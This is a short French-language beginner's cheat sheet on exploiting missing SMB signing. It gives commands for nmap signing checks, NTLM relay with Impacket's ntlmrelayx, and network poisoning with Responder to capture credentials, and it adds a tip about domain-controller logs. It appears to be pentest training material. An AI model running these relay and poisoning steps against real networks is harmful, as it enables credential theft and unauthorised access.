# SMB Signing Bypass

## Objectif
Exploiter l'absence ou la mauvaise configuration de la signature SMB pour réaliser des attaques de type relay ou man-in-the-middle.

---

## Explications vulgarisées
- La signature SMB permet de garantir l'intégrité des communications. Si elle est désactivée, un attaquant peut intercepter ou modifier les échanges (attaque relay, NTLM relay, etc.).

---

## Commandes et étapes essentielles

### 1. Vérification de la configuration SMB Signing
```bash
nmap --script smb2-security-mode -p 445 target.com
```
- **smb2-security-mode** : Indique si la signature SMB est requise ou non.
- **Exemple de sortie** :
```
| smb2-security-mode: 
|   2.02: 
|     Message signing enabled but not required
```
- **À surveiller** : "not required" = vulnérable.

### 2. Exploitation avec ntlmrelayx (Impacket)
```bash
ntlmrelayx.py -tf targets.txt -smb2support
```
- **ntlmrelayx.py** : Outil pour relayer des authentifications NTLM et obtenir un accès sur la cible.
- **Astuce débutant** : Préparer un fichier "targets.txt" avec les IPs des cibles.

### 3. Exploitation avec Responder
```bash
responder -I eth0
```
- **responder** : Outil pour empoisonner le réseau et capturer/relayer des identifiants NTLM.

---

## Conseils pour débutants
- Toujours vérifier si la signature SMB est "not required" avant de lancer une attaque relay.
- Attention à l'impact réseau et aux logs sur les contrôleurs de domaine.
- Lire la documentation de chaque outil pour découvrir des options avancées.

---

## Pour aller plus loin
- [PayloadsAllTheThings - SMB Relay](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/SMB%20Relay)
- [Impacket ntlmrelayx](https://github.com/SecureAuthCorp/impacket)
- [Responder](https://github.com/lgandx/Responder) 